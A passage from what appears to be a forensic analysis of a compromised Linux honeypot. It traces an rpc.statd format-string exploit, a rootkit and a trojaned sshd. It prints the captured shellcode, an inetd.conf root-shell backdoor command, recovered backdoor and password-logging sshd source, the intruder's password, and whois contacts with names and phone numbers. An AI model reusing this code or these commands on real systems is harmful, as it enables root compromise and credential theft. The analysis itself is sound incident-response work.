+    65757165 66207473 6820726f 6e74736f 20656d61 746e6f63 696e69\
+    61 2720676e 203a272f 000000000000000000000000000000000000000\
+    000000000000000000000000000000000000000000000000000000000000\
+    000000000000000000000000000000000000000000000000000000000000\
+    000000000000000000000000000000000000000000000000000000000000\
+    000000000000000bffff7040000000000000000000000000000000000000\
+    0000000000bffff7050000bffff706000000000000000000000000000000\
+    000000000000000000000000000000000000000000000000000000000000\
+    000000000000000000000000000000000000000000000000000000000000\
+    0000000000000000000000000000000000bffff707<90><90><90><90><9\
+    0><90><90><90><90><90><90><90><90><90><90><90><90><90><90><9\
+    0><90><90><90><90><90><90><90><90><90><90><90><90><90><90><9\
+    0><90><90><90><90><90><90><90><90><90><90><90><90><90><90><9\
+    0><EB>K^<89>v<AC><83><EE> <8D>^(<83><C6> <89>^<B0><83><EE> <\
+    8D>^.<83><C6> <83><C3> <83><EB>#<89>^<B4>1<C0><83><EE> <88>F\
+    '<88>F*<83><C6> <88>F<AB><89>F<B8><B0>+, <89><F3><8D>N<AC><8\
+    D>V<B8><CD><80>1<DB><89><D8>@<CD><80><E8><B0><FF><FF><FF>/bi\
+    n/sh -c echo 4545 stream tcp nowait root /bin/sh sh -i >> /e\
+    tc/inetd.conf;killall -HUP inetd
+    Nov  8 04:02:00 apollo anacron[2159]: Updated timestamp for job `cron.daily' to 2000-11-08
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Note that the logging includes a record time stamped at Nov  8
+04:02:00. This is evidence that "/var/log/messages" was edited long
+after the initial break-in.
+
+A slight variation of this technique (using "xxd") allows the
+hexadecimal values to be compared against the IDS logs more
+easily, which confirms that this was the attack vector logged
+by the IDS:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+2924630: 2031 0a4e 6f76 2020 3820 3030 3a30 393a   1.Nov  8 00:09:
+2924640: 3030 2061 706f 6c6c 6f20 7270 632e 7374  00 apollo rpc.st
+2924650: 6174 645b 3237 305d 3a20 534d 5f4d 4f4e  atd[270]: SM_MON
+2924660: 2072 6571 7565 7374 2066 6f72 2068 6f73   request for hos
+2924670: 746e 616d 6520 636f 6e74 6169 6e69 6e67  tname containing
+2924680: 2027 2f27 3a20 5e44 f7ff bf5e 44f7 ffbf   '/': ^D...^D...
+2924690: 5e45 f7ff bf5e 45f7 ffbf 5e46 f7ff bf5e  ^E...^E...^F...^
+29246a0: 46f7 ffbf 5e47 f7ff bf5e 47f7 ffbf 3038  F...^G...^G...08
+29246b0: 3034 3966 3130 2062 6666 6666 3735 3420  049f10 bffff754 
+29246c0: 3030 3030 3238 6638 2034 6435 6634 6435  000028f8 4d5f4d5
+29246d0: 3320 3732 3230 3465 3466 2036 3537 3537  3 72204e4f 65757
+29246e0: 3136 3520 3636 3230 3734 3733 2036 3832  165 66207473 682
+29246f0: 3037 3236 6620 3665 3734 3733 3666 2032  0726f 6e74736f 2
+2924700: 3036 3536 6436 3120 3734 3665 3666 3633  0656d61 746e6f63
+2924710: 2036 3936 6536 3936 3120 3237 3230 3637   696e6961 272067
+2924720: 3665 2032 3033 6132 3732 6620 3030 3030  6e 203a272f 0000
+2924730: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924740: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924750: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924760: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924770: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924780: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924790: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247a0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247b0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247c0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247d0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247e0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29247f0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924800: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924810: 3030 3030 3030 6266 6666 6637 3034 3030  000000bffff70400
+2924820: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924830: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924840: 3030 3030 3030 3030 3030 3030 3062 6666  0000000000000bff
+2924850: 6666 3730 3530 3030 3062 6666 6666 3730  ff7050000bffff70
+2924860: 3630 3030 3030 3030 3030 3030 3030 3030  6000000000000000
+2924870: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924880: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924890: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248a0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248b0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248c0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248d0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248e0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+29248f0: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924900: 3030 3030 3030 3030 3030 3030 3030 3030  0000000000000000
+2924910: 3030 3030 3030 3030 3062 6666 6666 3730  000000000bffff70
+2924920: 3790 9090 9090 9090 9090 9090 9090 9090  7...............
+2924930: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+2924940: 9090 9090 9090 9090 9090 9090 9090 9090  ................
+2924950: 9090 90eb 4b5e 8976 ac83 ee20 8d5e 2883  ....K^.v... .^(.
+2924960: c620 895e b083 ee20 8d5e 2e83 c620 83c3  . .^... .^... ..
+2924970: 2083 eb23 895e b431 c083 ee20 8846 2788   ..#.^.1... .F'.
+2924980: 462a 83c6 2088 46ab 8946 b8b0 2b2c 2089  F*.. .F..F..+, .
+2924990: f38d 4eac 8d56 b8cd 8031 db89 d840 cd80  ..N..V...1...@..
+29249a0: e8b0 ffff ff2f 6269 6e2f 7368 202d 6320  ...../bin/sh -c 
+29249b0: 6563 686f 2034 3534 3520 7374 7265 616d  echo 4545 stream
+29249c0: 2074 6370 206e 6f77 6169 7420 726f 6f74   tcp nowait root
+29249d0: 202f 6269 6e2f 7368 2073 6820 2d69 203e   /bin/sh sh -i >
+29249e0: 3e20 2f65 7463 2f69 6e65 7464 2e63 6f6e  > /etc/inetd.con
+29249f0: 663b 6b69 6c6c 616c 6c20 2d48 5550 2069  f;killall -HUP i
+2924a00: 6e65 7464 0a                             netd.
+
+Compare original IDS log below with offset 2924920 above:
+
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
+90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
+20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^... .. 
+83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
+2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
+8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
+B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
+63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream 
+74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root 
+2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
+20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
+3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
+65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
+74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+There is a slight discrepancy (57 minutes, 9 seconds) between the
+times shown by the IDS, and the times logged by syslog.  Two telnet
+connections show up (with a 3 second variance in log times) for
+another system on the network (.101), then an rpc.statd connection was
+logged 20 seconds later (which matches one found in deleted file
+space.)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov  8 00:08:40 apollo in.telnetd[2077]: connect from 216.216.74.2
+Nov  7 23:11:31 lisa snort[1260]: IDS08 - TELNET - daemon-active:
+172.16.1.101:23 -> 216.216.74.2:1209
+
+Nov  8 00:08:40 apollo in.telnetd[2078]: connect from 216.216.74.2
+Nov  7 23:11:34 lisa snort[1260]: IDS08 - TELNET - daemon-active:
+172.16.1.101:23 -> 216.216.74.2:1210
+
+Nov  8 00:09:00 apollo rpc.statd[270]: SM_MON request for hostname containing '/
+Nov  7 23:11:51 lisa snort[1260]: IDS362 - MISC - Shellcode X86 NOPS-UDP:
+216.216.74.2:710 -> 172.16.1.107:871
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+CERT vulnerability note #34043 describes the method of attack on the
+Linux rpc.statd process:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+    http://www.kb.cert.org/vuls/id/34043
+
+     . . .
+
+    The rpc.statd program passes user-supplied data to the syslog()
+    function as a format string. If there is no input validation of
+    this string, a malicious user can inject machine code to be
+    executed with the privileges of the rpc.statd process, typically
+    root.
+
+    I. Description
+
+    Intruder Activity
+  
+    The following is an example log message from a compromised system
+    illustrating the rpc.statd exploit occurring: 
+
+    Aug XX 17:13:08 victim rpc.statd[410]: SM_MON request for hostname
+    containing '/': ^D^D^E^E^F
+    ^F^G^G08049f10
+    bffff754 000028f8 4d5f4d53 72204e4f 65757165 66207473 6820726f 6e74736f
+    20656d61 746e6f63 696e6961 2720676e 203a272f
+    00000000000000000000000000000000000000000000000000000000000000000000000000000000
+    00000000000000000000000000000000000000000000000000000000000000000000000000000000
+    00000000000000000000000000000000000000000000000000000000000000000000000000bffff7
+    0400000000000000000000000000000000000000000000000bffff7050000bffff70600000000000
+    00000000000000000000000000000000000000000000000000000000000000000000000000000000
+    00000000000000000000000000000000000000000000000000000000000000000000000000000000
+    0000000000000bffff707K^v
+
+    ^( ^ ^.  #^
+    1
+    F'F* FF+,
+    NV1@/bin
+    /sh -c echo 9704 stream tcp 
+    nowait root /bin/sh sh -i >> /etc/inetd.conf;killall -HUP inetd
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+[Q1] This confirms the attack was against rpc.statd and that it
+occured (assuming the victim system clock is accurate and the IDS is
+off by -57:09) at 00:09:00 November 8, 2000, and not used until
+06:52:53 on that same day.  The only significant variation from the
+CERT advisory is the use of port 4545/tcp instead of 9704/tcp.
+
+Domain contact information for these connections is [Q2]:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Nov  8 00:08:40 apollo in.telnetd[2077]: connect from ATHM-216-216-xxx-2.home.net 
+Nov  8 00:08:40 apollo in.telnetd[2078]: connect from ATHM-216-216-xxx-2.home.net 
+
+[whois.arin.net]
+@Home Network / @Work Division (NETBLK-ATWORK-6) ATWORK-6
+                                                 216.216.0.0 - 216.217.255.255
+Advanced Commerce Systems (NETBLK-ATWORK-WI33381) ATWORK-WI33381
+                                                  216.216.74.0 - 216.216.74.15
+
+Advanced Commerce Systems (NETBLK-ATWORK-WI33381)
+   5910 N. Central Expressway, Suite 1040
+   Dallas, TX 75206
+   US
+
+   Netname: ATWORK-WI33381
+   Netblock: 216.216.74.0 - 216.216.74.15
+
+   Coordinator:
+      Anderson, Michael J.  (MJA-ARIN)  mianders@ADVANCEDCOMMERCE.COM
+      214-891-6306
+
+   Record last updated on 26-Jul-1999.
+   Database last updated on 17-Feb-2001 18:26:34 EDT.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The programs "q" and "qs" in the "/t/var/man/.Ci" directory are from
+Mixter's Q program (version 2), an encrypting remote shell.
+Differencing the strings in the intruder's binaries against those
+compiled on a test system shows the original path used when compiling
+the programs (which again shows the name "nap"):
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+1501c1391
+< /home/dittrich/src/Q2
+---
+> /dev/.oz/.nap/rkit/terror/Q2
+
+
+Encrypted password string used in intruder's version:
+
+f0X5+2m6EUTohXQQ8CnJXwavGGxXX4QiP2OKkZm81KY
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+The "paki" directory contains two denial of service programs, "slice2"
+and "stream".
+
+The "scan" directory contains scanners for vulnerable services,
+including "amd", "named" (BIND), rpc.statd, wu-ftpd, and open X
+servers (for keyboard snooping).
+
+
+The file ".p" is a rootkit configuration file that hides netstat
+connections.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+/usr/man/.p
+
+1 63.203
+2 63.203
+1 209.250
+2 209.250
+3 113
+4 113
+3 35350
+4 35350
+1 216.33
+2 216.33
+1 63.206
+2 63.206
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The netblocks 63.203 and 63.206 are both Pacific Bell customer
+networks.  Netblock 216.33 is owned by a single organization,
+NetMagic.  Netblocks in 209.250 are all owned by different entities.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Pacific Bell Internet Services,Inc. (NETBLK-PBI-NET-7) PBI-NET-7
+                                                   63.192.0.0 - 63.207.255.255
+
+NetMagic (NETBLK-ECI-216-33-0-0-22-001)
+   2542 South Bascom Ave.
+   Campbell, CA 95008
+   USA
+
+   Netname: ECI-216-33-0-0-22-001
+   Netblock: 216.33.0.0 - 216.33.3.255
+   Maintainer: NMJK
+
+   Coordinator:
+      Kalai, Micheal  (MK261-ARIN)  mike@NETMAGIC.NET
+      408.377.8986
+
+   Record last updated on 10-Feb-1999.
+   Database last updated on 17-Feb-2001 18:26:34 EDT.
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+At 06:59:52, the intruder links a .bash_history file in /tmp (the home
+directory of the "adm1" account) to /dev/null (disabling command
+history), then several resolver libraries and configuration files are
+touched (indicating a network connection is starting inbound).  A file
+"/t/var/tmp/nap" is created, and the commands "w" and "ps" are run
+(this is the trojan version of "ps", so the "/t/dev/ptyp" file is
+accessed).  The intruder then runs "pico" on the "/t/inetd.conf" file,
+then uses "killall" to send a signal to one or more processes.  (After
+writing to the inetd.conf file, one would need to send it a SIGHUP
+signal to force it to re-read the configuration file.  This would
+likely be the intruder setting up telnet for setting up back doors.)
+What is not clear here is what service was used for the login.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Nov 08 00 06:59:52        9 .a. lrwxrwxrwx root     root     /t/tmp/.bash_history -> /dev/null
+Nov 08 00 07:02:22       26 .a. -rw-r--r-- root     root     /t/etc/host.conf
+                      67580 .a. -rwxr-xr-x root     root     /t/lib/libnss_dns-2.1.3.so
+                         19 .a. lrwxrwxrwx root     root     /t/lib/libnss_dns.so.2 -> libnss_dns-2.1.3.so
+                     169720 .a. -rwxr-xr-x root     root     /t/lib/libresolv-2.1.3.so
+                         18 .a. lrwxrwxrwx root     root     /t/lib/libresolv.so.2 -> libresolv-2.1.3.so
+Nov 08 00 07:02:23       68 .a. -rw-r--r-- root     root     /t/etc/hosts
+                       1567 .a. -rw-r--r-- root     root     /t/etc/protocols
+Nov 08 00 07:02:28       10 .a. lrwxrwxrwx root     root     /t/usr/tmp -> ../var/tmp
+                       1024 m.c drwxrwxrwx root     root     /t/var/tmp
+                        184 mac -rw-r--r-- root     root     /t/var/tmp/nap
+Nov 08 00 07:02:30    44108 .a. -rwxr-xr-x root     root     /t/lib/libproc.so.2.0.6
+                       8860 .a. -r-xr-xr-x root     root     /t/usr/bin/w
+Nov 08 00 07:02:31    39423 .a. -r-xr-xr-x root     root     /t/bin/ps
+                        171 .a. -rw-r--r-- 1010     users    /t/dev/ptyp
+Nov 08 00 07:02:32    12288 .a. -rw-rw-r-- root     root     /t/etc/psdevtab
+Nov 08 00 07:02:42   166416 .a. -rwxr-xr-x root     root     /t/usr/bin/pico
+Nov 08 00 07:03:05     3027 m.c -rw-r--r-- root     root     /t/etc/inetd.conf
+Nov 08 00 07:03:12     3027 .a. -rw-r--r-- root     root     /t/etc/inetd.conf
+                      10160 .a. -rwxr-xr-x root     root     /t/usr/bin/killall
+Nov 08 00 07:03:15       24 .a. -rw-r--r-- root     root     /t/root/.bash_logout
+                       3124 .a. -rwxr-xr-x root     root     /t/usr/bin/clear
+                       1143 .a. -rw-r--r-- root     root     /t/usr/share/terminfo/v/vt100
+                       1143 .a. -rw-r--r-- root     root     /t/usr/share/terminfo/v/vt100-am
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Focusing on the file "/t/var/tmp/nap", created at 07:02, it can be
+seen to contain the following:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
++-[ User Login ]-------------------- --- --- - -
+| username: root password: tw1Lightz0ne hostname: c871553-b.jffsn1.mo.home.com
++----------------------------------- ----- --- -- -- -
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Site contact information for this host is as follows:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+The authoritative name servers for 'mo.home.com' are:
+  ns1.home.net              24.0.0.27
+  ns2.home.net              24.2.0.27
+                                         (querying server=24.0.0.27 ...)
+c871553-b.jffsn1.mo.home.com:
+    Internet address = 24.12.200.186
+
+% jwhois 24.12.200.186
+[whois.arin.net]
+@Home Network (NETBLK-ATHOME)   ATHOME                24.0.0.0 - 24.23.255.255
+@Home Network (NETBLK-CLMBA1-MO-1) CLMBA1-MO-1     24.12.192.0 - 24.12.207.255
+
+% jwhois NETBLK-CLMBA1-MO-1
+[whois.arin.net]
+@Home Network (NETBLK-CLMBA1-MO-1)
+   425 Broadway
+   Redwood City, CA 94063
+   US
+
+   Netname: CLMBA1-MO-1
+   Netblock: 24.12.192.0 - 24.12.207.255
+
+   Coordinator:
+      Operations, Network  (HOME-NOC-ARIN)  noc-abuse@noc.home.net
+      (650) 556-5599
+
+   Record last updated on 15-Nov-1999.
+   Database last updated on 17-Feb-2001 18:26:34 EDT.
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Searching all active files on the system for the name of the file
+and/or the tag line "User Login", shows only one possible file, the
+"sshd1" installed by the intruder:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# find . -type f | xargs egrep -l "/tmp/nap|User Login"
+./usr/local/sbin/sshd1
+./var/tmp/nap
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+As there is only one entry, it seems reasonable to assume that this
+was created by the intruder checking out the trojan (meant to harvest
+passwords for those using ssh, which would not be obtained by the
+sniffer, also running on the system.)  The account shown, however, is
+root.
+
+Strings examination of the sshd1 binary shows it to be based on
+version 1.2.27 source, and to have what appears to be an MD5 hash
+embedded in it:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ . . .
+i686-unknown-linux
+1.2.27
+sshd version %s [%s]
+ . . .
+Unknown group id %d
+none
+0123456789ABCDEF0123456789ABCDEF
+d33e8f1a6397c6d2efd9a2aae748eb02
+Cannot change user when server not running as root.
+ . . .
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Assuming this string will be embedded in deleted source code, a search
+is made of all partitions.  This search is successful, and confirms
+that this is part of a configure option and code feature:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+# for i in 1 5 6 7 8
+> do
+> echo hda$i; unrm honeypot.hda$i.dd | strings | grep d33e8f1a6397c6
+> done
+hda1
+hda5
+# ./configure  --enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=.
+    echo "running ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=. --no-create --no-recursion"
+    exec ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=. --no-create --no-recursion ;;
+  // "d33e8f1a6397c6d2efd9a2aae748eb02";
+#define USE_GLOBAL_PASS "d33e8f1a6397c6d2efd9a2aae748eb02"
+# ./configure  --enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap
+    echo "running ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --no-create --no-recursion"
+    exec ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --no-create --no-recursion ;;
+${ac_dA}USE_GLOBAL_PASS${ac_dB}USE_GLOBAL_PASS${ac_dC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_dD}
+${ac_uA}USE_GLOBAL_PASS${ac_uB}USE_GLOBAL_PASS${ac_uC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_uD}
+${ac_eA}USE_GLOBAL_PASS${ac_eB}USE_GLOBAL_PASS${ac_eC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_eD}
+d33e8f1a6397c6d2efd9a2aae748eb02
+d33e8f1a6397c6d2efd9a2aae748eb02
+  // "d33e8f1a6397c6d2efd9a2aae748eb02";
+# ./configure  --enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=.
+    echo "running ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=. --no-create --no-recursion"
+    exec ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --cache-file=.././config.cache
+--srcdir=. --no-create --no-recursion ;;
+#define USE_GLOBAL_PASS "d33e8f1a6397c6d2efd9a2aae748eb02"
+# ./configure  --enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap
+    echo "running ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --no-create --no-recursion"
+    exec ${CONFIG_SHELL-/bin/sh} ./configure
+--enable-global=d33e8f1a6397c6d2efd9a2aae748eb02
+--enable-sshd-log=/usr/tmp/nap --no-create --no-recursion ;;
+${ac_dA}USE_GLOBAL_PASS${ac_dB}USE_GLOBAL_PASS${ac_dC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_dD}
+${ac_uA}USE_GLOBAL_PASS${ac_uB}USE_GLOBAL_PASS${ac_uC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_uD}
+${ac_eA}USE_GLOBAL_PASS${ac_eB}USE_GLOBAL_PASS${ac_eC}"d33e8f1a6397c6d2efd9a2aae748eb02"${ac_eD}
+d33e8f1a6397c6d2efd9a2aae748eb02
+hda6
+hda7
+hda8
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Using the same method as above, the code segments are recoverable
+(code located approximately 616758198 bytes into honeypot.hda5.dd).
+The feature, and how it is used, are now readily apparent:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#ifdef USE_GLOBAL_PASS
+/* Check if the "global" password was entered */
+int check_global_passwd( unsigned char *pass )
+{
+  /* Paste here the output from md5sum --string="Your_Password" */
+  char md5passwd[33]=USE_GLOBAL_PASS;
+  // "3e3a378c63aa1e55e3e9ae9d2bdcd6a1";
+  struct MD5Context md;
+  unsigned char md5buffer[32];
+  int i;
+
+  /* Compute the response. */
+  MD5Init(&md);
+  MD5Update(&md, pass, strlen( pass));
+  MD5Final(md5buffer, &md);
+  for( i = 15; i >= 0; i-- )
+  {
+    md5buffer[i*2+1] = (md5buffer[i] & 0xf) + '0';
+    md5buffer[i*2] = (md5buffer[i] >> 4) + '0';
+  }
+  for( i = 0; i < 32; i++ )
+    if( md5buffer[i] > '9' )
+      md5buffer[i] += 0x27; /* lower case hexa chars */
+
+  if( strncmp(md5passwd,md5buffer,32) )
+    return 0;
+  else
+  {
+    /* Disable logging if conditions are met. */
+    lets_log=0; 
+    return 1;
+  }
+}
+#endif
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+The code segment for logging is also found:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#ifdef USE_GLOBAL_PASS
+          if (auth_password(user, password)  ||
+check_global_passwd(password))
+#else
+          if (auth_password(user, password))
+#endif
+#endif /* defined(KERBEROS) && defined(KRB5) */
+            {
+#ifdef SSHD_LOGGER
+         {
+          FILE *fp;
+          char sshdlog[]=SSHD_LOGGER;
+          fp=fopen(sshdlog,"a");
+          fprintf(fp,"+-[ User Login ]-------------------- --- --- -
+-\n");
+          fprintf(fp,"| username: %s password: %s hostname: %s\n",user,
+                password,get_canonical_hostname());
+          fprintf(fp,"+----------------------------------- ----- --- -- -- -\n\n");
+          fclose(fp);
+         }
+#endif
+              /* Successful authentication. */
+              /* Clear the password from memory. */
+              memset(password, 0, strlen(password));
+              xfree(password);
+#ifdef USE_GLOBAL_PASS
+              if( lets_log ) 
+                log_msg("Password authentication for %.100s accepted.", user); 
+              else 
+                log_msg("Closing connection to %.100s", get_remote_ipaddr());
+#else
+              log_msg("Password authentication for %.100s accepted.",
+user);
+#endif
+              authentication_type = SSH_AUTH_PASSWORD;
+              authenticated = 1;
+              break;
+            }
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+
+Based on the example, it can be seen that the password logged in
+"/t/var/tmp/nap" is in fact the backdoor password, which confirms that
+this is the intruder who was (unwittingly) logged:
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+#define USE_GLOBAL_PASS "d33e8f1a6397c6d2efd9a2aae748eb02"
+
+# md5sum --string=tw1Lightz0ne
+d33e8f1a6397c6d2efd9a2aae748eb02  "tw1Lightz0ne"
